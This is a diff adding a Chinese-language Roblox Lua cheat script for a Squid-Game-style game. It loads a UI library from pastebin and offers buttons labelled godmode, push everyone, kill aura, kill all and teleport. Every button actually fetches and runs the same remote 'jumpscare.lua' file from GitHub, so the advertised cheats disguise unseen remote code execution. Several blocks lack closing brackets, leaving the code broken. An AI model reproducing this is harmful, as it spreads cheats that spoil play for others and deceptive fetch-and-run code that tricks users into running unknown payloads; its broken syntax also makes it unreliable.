@@ -1,0 +1,302 @@
+local msg = Instance.new("Message",workspace)
+msg.Text = "欢迎使用棍母脚本"
+wait(2.5)
+msg:Destroy()
+local msg = Instance.new("Message",workspace)
+msg.Text = "此脚本只支持_墨水游戏"
+wait(1.8)
+local msg = Instance.new("Message",workspace)
+msg.Text = "如果有任何问题 请联系棍母本人"
+wait(1.8)
+msg:Destroy()
+local msg = Instance.new("Message",workspace)
+msg.Text = "加载中10%"
+wait(1.0)
+local msg = Instance.new("Message",workspace)
+msg.Text = "加载中30%"
+wait(1.0)
+local msg = Instance.new("Message",workspace)
+msg.Text = "加载中50%"
+wait(1.0)
+local msg = Instance.new("Message",workspace)
+msg.Text = "加载中80%"
+wait(1.0)
+local msg = Instance.new("Message",workspace)
+msg.Text = "加载中99%"
+wait(5.0)
+local msg = Instance.new("Message",workspace)
+msg.Text = "加载完毕"
+wait(1.0)
+local msg = Instance.new("Message",workspace)
+msg.Text = "情愉快使用此脚本"
+wait(1.0)
+msg:Destroy()
+
+local OrionLib = loadstring(game:HttpGet("https://pastebin.com/raw/FUEx0f3G"))()
+local LBLG = Instance.new("ScreenGui", getParent)
+local LBL = Instance.new("TextLabel", getParent)
+local player = game.Players.LocalPlayer
+
+LBLG.Name = "LBLG"
+LBLG.Parent = game.CoreGui
+LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+LBLG.Enabled = true
+LBL.Name = "LBL"
+LBL.Parent = LBLG
+LBL.BackgroundColor3 = Color3.new(1, 1, 1)
+LBL.BackgroundTransparency = 1
+LBL.BorderColor3 = Color3.new(0, 0, 0)
+LBL.Position = UDim2.new(0.75,0,0.010,0)
+LBL.Size = UDim2.new(0, 133, 0, 30)
+LBL.Font = Enum.Font.GothamSemibold
+LBL.Text = "TextLabel"
+LBL.TextColor3 = Color3.new(1, 1, 1)
+LBL.TextScaled = true
+LBL.TextSize = 14
+LBL.TextWrapped = true
+LBL.Visible = true
+
+local FpsLabel = LBL
+local Heartbeat = game:GetService("RunService").Heartbeat
+local LastIteration, Start
+local FrameUpdateTable = {}
+
+local function HeartbeatUpdate()
+	LastIteration = tick()
+	for Index = #FrameUpdateTable, 1, -1 do
+		FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
+	end
+	FrameUpdateTable[1] = LastIteration
+	local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
+	CurrentFPS = CurrentFPS - CurrentFPS % 1
+	FpsLabel.Text = ("棍母时间"..os.date("%H").."时"..os.date("%M").."分"..os.date("%S").."秒")
+end
+Start = tick()
+Heartbeat:Connect(HeartbeatUpdate)
+local Window = OrionLib:MakeWindow({Name = "棍母脚本", HidePremium = false, SaveConfig = true,IntroText = "欢迎使用棍母脚本", ConfigFolder = "此脚本为墨水游戏脚本"})
+game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "棍母脚本"; Text ="欢迎使用棍母脚本"; Duration = 4; })
+game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "棍母脚本"; Text ="棍母脚本"; Duration = 4; })
+game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "棍母脚本"; Text ="玩脚本就玩棍母脚本"; Duration = 4; })
+local Tab = Window:MakeTab({
+    Name = "用户信息",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+Tab:AddParagraph("用户名:"," "..game.Players.LocalPlayer.Name.."")
+Tab:AddParagraph("你的注入器:"," "..identifyexecutor().."")
+Tab:AddParagraph("服务器的ID"," "..game.GameId.."")
+
+local Tab = Window:MakeTab({
+    Name = "红灯绿灯",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddButton({
+    Name ="无敌模式",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+Tab:AddButton({
+    Name ="自动推所有人",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+Tab:AddButton({
+    Name ="扔沙子无冷却",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+Tab:AddButton({
+    Name ="推人无冷却",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+Tab:AddButton({
+    Name ="自动送人到起点",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+Tab:AddButton({
+    Name ="自动送人到终点",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+Tab:AddButton({
+    Name ="隐身模式",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+Tab:AddButton({
+    Name ="自动传送到终点",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+local Tab = Window:MakeTab({
+    Name = "扣糖饼",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddButton({
+    Name ="糖饼无法损坏",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+Tab:AddButton({
+    Name ="自动扣糖饼",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+local Tab = Window:MakeTab({
+    Name = "关灯房",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddButton({
+    Name ="杀戳光环",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+Tab:AddButton({
+    Name ="传送到安全区",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+local Tab = Window:MakeTab({
+    Name = "躲藏与寻找",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddButton({
+    Name ="自动杀死所有人",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+Tab:AddButton({
+    Name ="传送到安全区",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+Tab:AddButton({
+    Name ="出口无钥匙即可打开",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+local Tab = Window:MakeTab({
+    Name = "拔河",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddButton({
+    Name ="暴乱模式",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+Tab:AddButton({
+    Name ="自动拔河（合法）",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+    local Tab = Window:MakeTab({
+    Name = "跳绳",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddButton({
+    Name ="防坠落",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+Tab:AddButton({
+    Name ="无视绳子",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+    Tab:AddButton({
+    Name ="自动传送到终点",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end;
+        local Tab = Window:MakeTab({
+    Name = "玻璃桥",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddButton({
+    Name ="防坠落",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+Tab:AddButton({
+    Name ="显示玻璃",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+    Tab:AddButton({
+    Name ="自动传送到终点",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end;
+            local Tab = Window:MakeTab({
+    Name = "旋转木马",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddButton({
+    Name ="自动qta",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+
+            local Tab = Window:MakeTab({
+    Name = "决战",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddButton({
+    Name ="保持在敌人背后",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+
+            local Tab = Window:MakeTab({
+    Name = "叛乱",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddButton({
+    Name ="清空守卫",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
+            local Tab = Window:MakeTab({
+    Name = "天空鱼",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddButton({
+    Name ="防坠落",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheqopThe/robax/refs/heads/main/jumpscare.lua"))()
+    end
+})
